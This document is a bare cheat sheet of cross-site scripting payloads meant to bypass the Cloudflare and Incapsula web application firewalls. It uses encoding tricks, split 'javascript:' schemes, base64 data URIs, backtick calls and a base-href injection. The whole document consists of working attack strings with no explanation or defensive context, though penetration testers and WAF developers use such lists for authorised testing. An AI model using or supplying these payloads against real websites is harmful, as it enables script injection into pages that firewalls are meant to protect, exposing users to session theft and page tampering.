### Cloudflare XSS Bypasses

```javascript
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`hello`+
1'"><img/src/onerror=.1|alert``>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
</script><svg><script>alert(1)-%26apos%3B
```

### Incapsula WAF Bypass
```
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```
